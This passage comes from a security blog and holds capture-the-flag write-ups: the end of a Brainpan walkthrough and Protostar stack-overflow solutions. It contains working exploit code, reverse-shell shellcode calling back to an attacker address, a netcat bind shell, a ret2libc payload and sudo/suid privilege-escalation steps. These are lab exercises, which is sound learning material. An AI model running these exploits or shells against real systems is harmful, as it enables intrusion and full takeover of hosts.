</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
</span><span class='line'>
</span><span class='line'># msfpayload linux/x86/shell_reverse_tcp LHOST=192.168.1.74 LPORT=443 R | msfencode -e x86/shikata_ga_nai -t c
</span><span class='line'>#[*] x86/shikata_ga_nai succeeded with size 95 (iteration=1)
</span><span class='line'>
</span><span class='line'>shell = "\xdb\xc8\xbf\x12\xad\xd5\x16\xd9\x74\x24\xf4\x58\x29\xc9\xb1"\
</span><span class='line'>        "\x12\x31\x78\x17\x03\x78\x17\x83\xfa\x51\x37\xe3\xcb\x72\x4f"\
</span><span class='line'>        "\xef\x78\xc6\xe3\x9a\x7c\x41\xe2\xeb\xe6\x9c\x65\x98\xbf\xae"\
</span><span class='line'>        "\x59\x52\xbf\x86\xdc\x95\xd7\xd8\xb7\x67\x6d\xb1\xc5\x67\x70"\
</span><span class='line'>        "\xfa\x43\x86\xc2\x9a\x03\x18\x71\xd0\xa7\x13\x94\xdb\x28\x71"\
</span><span class='line'>        "\x3e\xcb\x07\x05\xd6\x7b\x77\x8b\x4f\x12\x0e\xa8\xdd\xb9\x99"\
</span><span class='line'>        "\xce\x51\x36\x57\x90";
</span><span class='line'>
</span><span class='line'>try:
</span><span class='line'>    payload = '\x41' * 520        #junk
</span><span class='line'>    payload += '\x90'*4           #ebp
</span><span class='line'>    payload += '\xf0\x12\x17\x31' #push ebp; mov ebp,esp; jmp esp
</span><span class='line'>    payload += '\x90'*50          #nop sled
</span><span class='line'>    payload += shell              #shellcode
</span><span class='line'>
</span><span class='line'>    s = socket.socket()
</span><span class='line'>    s.connect(('192.168.1.110', 9999))
</span><span class='line'>    s.recv(1024)
</span><span class='line'>    s.send(payload)
</span><span class='line'>except Exception, e: print e</span></code></pre></td></tr></table></div></figure>


<p>I then had a connected shell waiting for me on 192.168.1.74; a bit of enumeration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami  
</span><span class='line'>puck
</span><span class='line'>$ uname -a
</span><span class='line'>Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
</span><span class='line'>$ id
</span><span class='line'>uid=1002(puck) gid=1002(puck) groups=1002(puck)
</span><span class='line'>$ ls /home/
</span><span class='line'>anansi
</span><span class='line'>puck
</span><span class='line'>reynard</span></code></pre></td></tr></table></div></figure>


<p>To ease my curiousity about the ELF/EXE web server running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /home/puck/checksrv.sh
</span><span class='line'>#!/bin/bash
</span><span class='line'># run brainpan.exe if it stops
</span><span class='line'>lsof -i:9999
</span><span class='line'>if [[ $? -eq 1 ]]; then 
</span><span class='line'>    pid=`ps aux | grep brainpan.exe | grep -v grep`
</span><span class='line'>    if [[ ! -z $pid ]]; then
</span><span class='line'>        kill -9 $pid
</span><span class='line'>        killall wineserver
</span><span class='line'>        killall winedevice.exe
</span><span class='line'>    fi
</span><span class='line'>    /usr/bin/wine /home/puck/web/bin/brainpan.exe &
</span><span class='line'>fi 
</span><span class='line'>
</span><span class='line'># run SimpleHTTPServer if it stops
</span><span class='line'>lsof -i:10000
</span><span class='line'>if [[ $? -eq 1 ]]; then 
</span><span class='line'>    pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
</span><span class='line'>    if [[ ! -z $pid ]]; then
</span><span class='line'>        kill -9 $pid
</span><span class='line'>    fi
</span><span class='line'>    cd /home/puck/web
</span><span class='line'>    /usr/bin/python -m SimpleHTTPServer 10000
</span><span class='line'>fi </span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s not actually an elf, but an exe that&rsquo;s running under WINE.  Another interesting bit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ which gcc
</span><span class='line'>$ which cc
</span><span class='line'>$ which gdb
</span><span class='line'>$ which objdump</span></code></pre></td></tr></table></div></figure>


<p>So if we happen to find any more binaries to exploit, we need to hack on it blind.  And in this case&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ find / -perm +6000 -type f -exec ls -ld {} \; &gt; setuid; echo done
</span><span class='line'>$ cat setuid
</span><span class='line'>-rwsr-xr-x 1 root root 63632 Sep  6  2012 /bin/umount
</span><span class='line'>-rwsr-xr-x 1 root root 31124 Sep  6  2012 /bin/su
</span><span class='line'>-rwsr-xr-x 1 root root 88768 Sep  6  2012 /bin/mount
</span><span class='line'>-rwsr-xr-x 1 root root 30112 Jun 11  2012 /bin/fusermount
</span><span class='line'>-rwsr-xr-x 1 root root 39124 Oct  2 17:26 /bin/ping6
</span><span class='line'>-rwsr-xr-x 1 root root 34780 Oct  2 17:26 /bin/ping
</span><span class='line'>-rwxr-sr-x 1 root tty 18056 Sep  6  2012 /usr/bin/wall
</span><span class='line'>-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudo
</span><span class='line'>-rwxr-sr-x 1 root shadow 45292 Sep  6  2012 /usr/bin/chage
</span><span class='line'>-rwxr-sr-x 1 root crontab 34784 Jun 14  2012 /usr/bin/crontab
</span><span class='line'>-rwsr-xr-x 1 root root 60344 Jun 18  2012 /usr/bin/mtr
</span><span class='line'>-rwxr-sr-x 1 root mail 13944 Jun 14  2012 /usr/bin/dotlockfile
</span><span class='line'>-rwsr-xr-x 1 root root 30936 Sep  6  2012 /usr/bin/newgrp
</span><span class='line'>-rwsr-xr-x 1 root root 31756 Sep  6  2012 /usr/bin/chsh
</span><span class='line'>-rwxr-sr-x 1 root mlocate 34452 Aug 14  2012 /usr/bin/mlocate
</span><span class='line'>-rwxr-sr-x 1 root shadow 18128 Sep  6  2012 /usr/bin/expiry
</span><span class='line'>-rwxr-sr-x 1 root tty 9736 Jun 18  2012 /usr/bin/bsd-write
</span><span class='line'>-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudoedit
</span><span class='line'>-rwsr-xr-x 1 root root 40300 Sep  6  2012 /usr/bin/chfn
</span><span class='line'>-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-lock
</span><span class='line'>-rwsr-xr-x 1 root root 14020 Oct  2 17:26 /usr/bin/traceroute6.iputils
</span><span class='line'>-rwsr-sr-x 1 daemon daemon 46576 Jun 11  2012 /usr/bin/at
</span><span class='line'>-rwsr-xr-x 1 root lpadmin 13672 Dec  4 09:21 /usr/bin/lppasswd
</span><span class='line'>-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-touchlock
</span><span class='line'>-rwsr-xr-x 1 root root 41292 Sep  6  2012 /usr/bin/passwd
</span><span class='line'>-rwsr-xr-x 1 root root 57964 Sep  6  2012 /usr/bin/gpasswd
</span><span class='line'>-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-unlock
</span><span class='line'>-rwxr-sr-x 1 root ssh 128424 Sep  6  2012 /usr/bin/ssh-agent
</span><span class='line'>-rwsr-sr-x 1 libuuid libuuid 17996 Sep  6  2012 /usr/sbin/uuidd
</span><span class='line'>-rwsr-xr-- 1 root dip 301944 Sep 26  2012 /usr/sbin/pppd
</span><span class='line'>**-rwsr-xr-x 1 anansi anansi 8761 Mar  4 11:06 /usr/local/bin/validate**
</span><span class='line'>-rwsr-xr-- 1 root messagebus 317564 Oct  3 16:00 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span><span class='line'>-rwsr-xr-x 1 root root 248064 Sep  6  2012 /usr/lib/openssh/ssh-keysign
</span><span class='line'>-rwsr-xr-x 1 root root 5452 Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
</span><span class='line'>-rwsr-xr-x 1 root root 9740 Oct  3 21:46 /usr/lib/pt_chown
</span><span class='line'>-rwxr-sr-x 1 root shadow 30372 Jul  3  2012 /sbin/unix_chkpwd</span></code></pre></td></tr></table></div></figure>


<p>The bolded entry in our list appears to be suid one of the other users, so it&rsquo;s likely we&rsquo;ll need to attack this one.  And, as mentioned earlier, we have zero debugging tools.  To make matters even worse:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /proc/sys/kernel/randomize_va_space
</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>


<p>This means full address space layout randomization is enabled.  This should be fun without debugging tools.</p>

<p>One solution (and one my good friend @mulitia used) is to put shellcode into an environmental variable, netcat over a binary for finding its address, then spamming VAS with that address.  This is a brute-force method that works, but in a real environment might not be the most stealthy of ways.  Another way is to make use of a JMP [register] (say, one we control) and move execution to shellcode space.  If we objdump the binary and hunt for JMP, there are none which point to registers.  Another option is CALL, which is essentially a macro to push/jmp:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~/brainpan# objdump -M intel -d validate | grep "call"
</span><span class='line'> 8048353:    e8 00 00 00 00           call   8048358 &lt;_init+0xc&gt;
</span><span class='line'> 8048369:    e8 1e 00 00 00           call   804838c &lt;__gmon_start__@plt&gt;
</span><span class='line'> 804836e:    e8 1d 01 00 00           call   8048490 &lt;frame_dummy&gt;
</span><span class='line'> 8048373:    e8 98 02 00 00           call   8048610 &lt;__do_global_ctors_aux&gt;
</span><span class='line'> 804841c:    e8 7b ff ff ff           call   804839c &lt;__libc_start_main@plt&gt;
</span><span class='line'> 8048468:    ff 14 85 14 9f 04 08     call   DWORD PTR [eax*4+0x8049f14]
</span><span class='line'> 80484af:    ff d0                    call   eax
</span><span class='line'> 80484f3:    e8 d4 fe ff ff           call   80483cc &lt;printf@plt&gt;
</span><span class='line'> 80484ff:    e8 e8 fe ff ff           call   80483ec &lt;exit@plt&gt;
</span><span class='line'> 8048511:    e8 96 fe ff ff           call   80483ac &lt;strlen@plt&gt;
</span><span class='line'> 8048527:    e8 90 fe ff ff           call   80483bc &lt;strcpy@plt&gt;
</span><span class='line'> 8048558:    e8 6f fe ff ff           call   80483cc &lt;printf@plt&gt;
</span><span class='line'> 804856c:    e8 5b fe ff ff           call   80483cc &lt;printf@plt&gt;
</span><span class='line'> 804857c:    e8 33 ff ff ff           call   80484b4 &lt;validate&gt;
</span><span class='line'> 8048593:    e8 44 fe ff ff           call   80483dc &lt;puts@plt&gt;
</span><span class='line'> 80485b6:    e8 4f 00 00 00           call   804860a &lt;__i686.get_pc_thunk.bx&gt;
</span><span class='line'> 80485c4:    e8 83 fd ff ff           call   804834c &lt;_init&gt;
</span><span class='line'> 80485f4:    ff 94 b3 18 ff ff ff     call   DWORD PTR [ebx+esi*4-0xe8]
</span><span class='line'> 804862b:    ff d0                    call   eax
</span><span class='line'> 8048643:    e8 00 00 00 00           call   8048648 &lt;_fini+0xc&gt;
</span><span class='line'> 804864f:    e8 dc fd ff ff           call   8048430 &lt;__do_global_dtors_aux&gt;
</span><span class='line'>root@bt:~/brainpan# </span></code></pre></td></tr></table></div></figure>


<p>Two options here!  Let&rsquo;s see if we control EAX&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~/brainpan# gdb ./validate
</span><span class='line'>Reading symbols from /root/brainpan/validate...done.
</span><span class='line'>(gdb) r $(perl -e 'print "\x41"x120')
</span><span class='line'>Starting program: /root/brainpan/validate $(perl -e 'print "\x41"x120')
</span><span class='line'>warning: the debug information found in "/lib/ld-2.11.1.so" does not match "/lib/ld-linux.so.2" (CRC mismatch).
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x41414141 in ?? ()
</span><span class='line'>(gdb) x/x $eax
</span><span class='line'>0xffffd3e8:    0x41414141
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>Great, we can now leverage a ret2eax attack.  We&rsquo;ll just need to fill up the required 116 bytes prior to the EIP overwrite, then fill that with our CALL EAX:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./validate $(perl -e 'print "\xbe\x1f\x41\x25\xe8\xd9\xed\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x0c\x83\xc3\x04\x31\x73\x0f\x03\x73\x10\xa3\xd0\x82\x25\x7b\x82\x01\x5f\x13\x99\xc6\x16\x04\x89\x27\x5b\xa3\x4a\x50\xb4\x51\x22\xce\x43\x76\xe6\xe6\x59\x79\x07\xf7\x72\x1b\x6e\x99\xa3\xbf\x11\x16\xd3\x3f\x85\x8b\xaa\xa1\xe4\xac" . "\x90"x44 . "\x2b\x86\x04\x08"')
</span><span class='line'>$ whoami
</span><span class='line'>anansi</span></code></pre></td></tr></table></div></figure>


<p>Success; another local user.  I&rsquo;d like to briefly note that I had alot of issues getting shellcode to work if it was placed after the NOP sled, as opposed to before.</p>

<p>Now that we&rsquo;ve got our second account, we can hunt around the system in search of more binaries to exploit.  As our prior search discovered, nothing is suid root.  Checking out /home/anansi gives us:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ pwd && ls -lh
</span><span class='line'>/home/anansi/bin
</span><span class='line'>total 8.0K
</span><span class='line'>-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util
</span><span class='line'>$ ./anansi_util
</span><span class='line'>Usage: ./anansi_util [action]
</span><span class='line'>Where [action] is one of:
</span><span class='line'>  - network
</span><span class='line'>  - proclist
</span><span class='line'>  - manual [command]</span></code></pre></td></tr></table></div></figure>


<p>I couldn&rsquo;t find any segmentation faults with this, but I did note the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo -l
</span><span class='line'>Matching Defaults entries for puck on this host:
</span><span class='line'>    env_reset, mail_badpass,
</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span><span class='line'>
</span><span class='line'>User puck may run the following commands on this host:
</span><span class='line'>    (root) NOPASSWD: /home/anansi/bin/anansi_util</span></code></pre></td></tr></table></div></figure>


<p>It would appear we can <code>sudo ./anansi_util</code> without the need for a password.  And we own the binary!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mv anansi_util anansi_util_bkp
</span><span class='line'>$ ln -s /bin/sh ./anansi_util
</span><span class='line'>$ ls -lh
</span><span class='line'>total 8.0K
</span><span class='line'>lrwxrwxrwx 1 anansi puck      7 Mar 31 15:27 anansi_util -&gt; /bin/sh
</span><span class='line'>-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util_bkp
</span><span class='line'>$ sudo ./anansi_util
</span><span class='line'>$ whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>One of the more interesting boot2root&rsquo;s I&rsquo;ve had the privilege of exploiting, and a trend I hope to see continue.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Stack Levels]]></title>
    <link href="http://hatRiot.github.io/blog/2013/03/31/protostar-solutions-stack-levels/"/>
    <updated>2013-03-31T00:21:16-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/03/31/protostar-solutions-stack-levels</id>
    <content type="html"><![CDATA[<p>Part two of the three <a href="http://exploit-exercises.com/">exploit exercises</a> available.  This set of challenges focused purely on memory corruption via stack overflows; the challenges here weren&rsquo;t too difficult, but I wanted to work through them anyway.  A post with the remaining levels will follow.</p>

<h3>Stack Level 00</h3>


<p>Introductory level that introduces stack layout; here, the <code>modified</code> variable follows a 64 byte array on the stack.  If the stack is overwritten, the modified variable will be run over.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ python -c "print 'A'*70" | ./stack0 
</span><span class='line'>you have changed the 'modified' variable
</span><span class='line'>user@protostar:~$</span></code></pre></td></tr></table></div></figure>




<h3>Stack Level 01</h3>


<p>Another introductory level that forces you to overwrite a particular variable with a specific value.  Essentially we need to take level 00 and figure out exactly where to overwrite the modified variable.  This can be trivially guessed, considering we know the buf size.  Remembering that this architecture is little endian:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ./stack1 $(perl -e 'print "A"x64 . "dcba"')
</span><span class='line'>you have correctly got the variable to the right value
</span><span class='line'>user@protostar:~$</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s also worth noting that, if you&rsquo;re loading this into gdb, the modified variable is volatile, so if you <code>p &amp;modified</code> and don&rsquo;t get the right value, don&rsquo;t worry.  You&rsquo;re not crazy.</p>

<h3>Stack Level 02</h3>


<p>Almost a carbon copy of level 1, except this time our input vector is an environmental variable.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ export GREENIE=$(perl -e 'print "A"x64 . "\x0a\x0d\x0a\x0d"')
</span><span class='line'>user@protostar:~$ ./stack2
</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure>




<h3>Stack Level 03</h3>


<p>This level has us redirecting code flow to another function present in the source.  The buffer length is the same as the previous three, so we just need to find out where the function lies.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -d stack3 | grep win
</span><span class='line'>08048424 &lt;win&gt;:
</span><span class='line'>user@protostar:~$ echo $(perl -e 'print "A"x64 . "\x24\x84\x04\x08"') | ./stack3
</span><span class='line'>calling function pointer, jumping to 0x08048424
</span><span class='line'>code flow successfully changed
</span><span class='line'>user@protostar:~$ </span></code></pre></td></tr></table></div></figure>




<h3>Stack Level 04</h3>


<p>Instead of overwriting a function call, we&rsquo;ll be overwriting a return address.  When the function exits, it pops the current stack frame off and returns the saved frame pointer, so we need only overflow the address immediately following EBP.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -d stack4 | grep win
</span><span class='line'>080483f4 &lt;win&gt;:
</span><span class='line'>user@protostar:~$ perl -e 'print "A"x76 . "\xf4\x83\x04\x08"' | ./stack4 
</span><span class='line'>code flow successfully changed
</span><span class='line'>Segmentation fault
</span><span class='line'>user@protostar:~$ </span></code></pre></td></tr></table></div></figure>




<h3>Stack Level 05</h3>


<p>There&rsquo;s no real flag here aside from getting a shell, so we&rsquo;ll need some shellcode now.  Disclaimer: I spent a good deal of time trying to get shellcode working for this, and would continually brick wall at the same spot:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) ni
</span><span class='line'>Executing new program: /bin/dash
</span><span class='line'>Error in re-setting breakpoint 1: Function "main" not defined.
</span><span class='line'>
</span><span class='line'>Program exited normally.
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>During one of my googling escapades, I haphazardly clicked <a href="http://www.mattandreko.com/2011/12/exploit-exercises-protostar-stack-5.html">this</a> link from someone having the exact same issues with this level.  What should be a very simple buffer overflow turned into a very wonky, absurd tumble through some obscure shellcode issues.  In the end, I came up with this solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x76 . "\x80\xf7\xff\xbf" . "\x90"x9 . "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' | ./stack5 
</span><span class='line'># whoami
</span><span class='line'>root
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>




<h3>Stack Level 06</h3>


<p>This level forces us to place our shellcode in a specific path; i.e. out of userland.  We can&rsquo;t just stick it onto the stack, and we can&rsquo;t place it in an environmental variable.  Instead, we must use ret2[libc|strcpy|gets|etc] or ROP.  It verifies the function&rsquo;s return address by calling <code>__built_return_address(0)</code>, which will return the current function&rsquo;s return address.</p>

<p>This one was pretty fun, as I was able to leverage the ret2libc to pull it off.  I used c0ntext&rsquo;s <a href="http://css.csail.mit.edu/6.858/2012/readings/return-to-libc.pdf">ret2libc</a> demonstration paper as reference.  I based most of my work off the previous level, and modified it only by adding system() and exit() addresses.  My payload in the end looked like this:</p>

<p><code>[80 bytes junk | system() address | exit() address | command]</code></p>

<p>For this example, I have my command stashed in the GETME environmental variable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ export GETME=/bin/sh
</span><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x86\xff\xff\xbf";' | ./stack6
</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췆���
</span><span class='line'>user@protostar:/opt/protostar/bin$ export GETME=/usr/bin/whoami
</span><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x80\xff\xff\xbf";' | ./stack6
</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췀���
</span><span class='line'>root
</span><span class='line'>user@protostar:/opt/protostar/bin$ </span></code></pre></td></tr></table></div></figure>


<p>I wasn&rsquo;t able to get /bin/sh launched with a system() call, and after checking the man page, it appears that system drops root privileges.  My second thought was to simply open up a reverse shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ export GETME="/bin/nc -l -p 5555 -e /bin/sh"
</span><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x72\xff\xff\xbf";' | ./stack6
</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`��r���</span></code></pre></td></tr></table></div></figure>


<p>I now had a root shell listening on port 5555.</p>

<h3>Stack Level 07</h3>


<p>The final stack level is almost exactly like the previous level, however this time when it returns from getpath(), it returns strdup(buffer), which returns a pointer to a duplicate string of buffer.  The address range is also now much more restrictive; disabling any address matching 0xb0000000.  The exploit page notes that we should be thinking about a ret2text to exploit this, so I started thinking of ways to ret2plt or ret2dl-resolve, but in the end decided those were likely too advanced for such a simple level.  Instead, I objdump&rsquo;d the binary in search of a POP POP RET, which would bypass the addressing filter and allow me to take control over EIP.  The first one I found was at <code>0x8048492</code>.  After some twiddling, I discovered the following would lead me to code execution: <code>perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8' . "\xcc"x16 | ./stack7</code>.  So the payload will look like this <code>[80 bytes junk | POP POP RET | 8 bytes junk | shellcode]</code></p>

<p>I dumped the shellcode from level 5 into this, but for some reason the shell would only spawn if running in gdb:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
